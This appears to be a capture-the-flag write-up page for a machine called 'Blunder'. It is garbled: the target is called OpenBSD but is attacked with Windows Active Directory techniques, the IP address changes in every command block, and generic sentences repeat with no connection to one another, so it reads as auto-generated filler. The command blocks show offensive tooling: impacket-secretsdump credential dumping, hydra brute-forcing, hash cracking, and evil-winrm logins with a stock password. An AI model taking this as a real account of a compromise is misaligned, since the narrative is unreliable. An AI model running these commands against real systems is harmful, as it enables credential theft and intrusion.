---
TitleSEO: "PwnTillDawn — Blunder (Hard OpenBSD) | ZureFX"
TitlePost: "PwnTillDawn — Blunder (Hard OpenBSD)"
Author: "ZureFX"
Description: "Full writeup for PwnTillDawn Blunder. AlwaysInstallElevated and DCSync to achieve hard compromise on OpenBSD."
Keywords: "insane, hard, ctf, easy"
URL: "https://zurefx.github.io/writeups/htb-blunder-146.html"
URL_IMAGES: "https://raw.githubusercontent.com/zurefx/images/refs/heads/main/writeups/htb-blunder-146/"
Date: "2024-11-04"
Tags: "Insane, Hard, CTF, Easy"
Section: "writeups"
Lang: "en"
main_img: "htb-blunder-146"
Permalink: "/writeups/htb-blunder-146.html"
BtnLabel: "Read Writeup"
Pick: 1
---
## Machine Info

### Overview

The target **Blunder** is rated **Hard** on PwnTillDawn. It runs **OpenBSD** and the IP address during this analysis was `10.37.102.93`.

### Objectives

Unconstrained delegation was enabled on the compromised machine. Authentication bypass was achieved through careful manipulation of the login mechanism.

## Enumeration

### Port Scanning

Starting with a full port scan to identify the attack surface.

```bash
nmap -sCV -p135,5985,8888 10.129.186.186 -oN scan.txt
```

The scheduled task ran with elevated privileges and could be abused for escalation. Token impersonation allowed elevation to SYSTEM privileges on the target.

### Service Enumeration

Token impersonation allowed elevation to SYSTEM privileges on the target. The database credentials were hardcoded in the application source code. The backup files contained sensitive information that should not have been accessible.

```bash
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

The service account had excessive permissions assigned in Active Directory. Privilege escalation was possible due to misconfigured sudo permissions.

### SMB Enumeration

Privilege escalation was possible due to misconfigured sudo permissions. Lateral movement was facilitated by reusing discovered credentials across services.

```bash
crackmapexec smb 10.108.194.159 -u administrator -p 'P@ssw0rd!' --shares
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.18.7.39/FUZZ
```

Command injection was possible through unsanitized user input in the search functionality. Group Policy Preferences contained encrypted but recoverable credentials. Group Policy Preferences contained encrypted but recoverable credentials.

## Exploitation

### Vulnerability Identification

The scheduled task ran with elevated privileges and could be abused for escalation. The service account had excessive permissions assigned in Active Directory. Post-exploitation enumeration revealed a path to domain administrator privileges.

Key finding: **DCSync**.

Post-exploitation enumeration revealed a path to domain administrator privileges. Weak file permissions allowed modification of critical system files.

### Initial Access

Authentication bypass was achieved through careful manipulation of the login mechanism. Token impersonation allowed elevation to SYSTEM privileges on the target.

```bash
feroxbuster -h
impacket-secretsdump administrator:'P@ssw0rd!'@10.78.181.108
evil-winrm -i 10.46.91.93 -u administrator -p 'P@ssw0rd!'
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

Command injection was possible through unsanitized user input in the search functionality. The scheduled task ran with elevated privileges and could be abused for escalation. The application stored sensitive credentials in an unencrypted configuration file.

## Privilege Escalation

### Enumeration

Initial enumeration revealed several interesting open ports on the target. The scheduled task ran with elevated privileges and could be abused for escalation. The scheduled task ran with elevated privileges and could be abused for escalation.

```powershell
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.42.1.181 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
evil-winrm -i 10.52.138.252 -u administrator -p 'P@ssw0rd!'
```

### Exploitation

The backup files contained sensitive information that should not have been accessible. Network traffic analysis revealed unencrypted communications containing user credentials.

```powershell
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.76.102.182 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
impacket-secretsdump administrator:'P@ssw0rd!'@10.36.220.135
nmap -sCV -p587,5432,587 10.12.67.240 -oN scan.txt
```

The scheduled task ran with elevated privileges and could be abused for escalation. The application stored sensitive credentials in an unencrypted configuration file.

### Root/SYSTEM

Successfully obtained **SYSTEM** access on the target.

Privilege escalation was possible due to misconfigured sudo permissions. Post-exploitation enumeration revealed a path to domain administrator privileges.

## Summary

### Tools Used

- `ffuf`
- `bloodhound`
- `enum4linux`
- `ligolo-ng`
- `impacket`

### Key Takeaways

- AlwaysInstallElevated
- DCSync
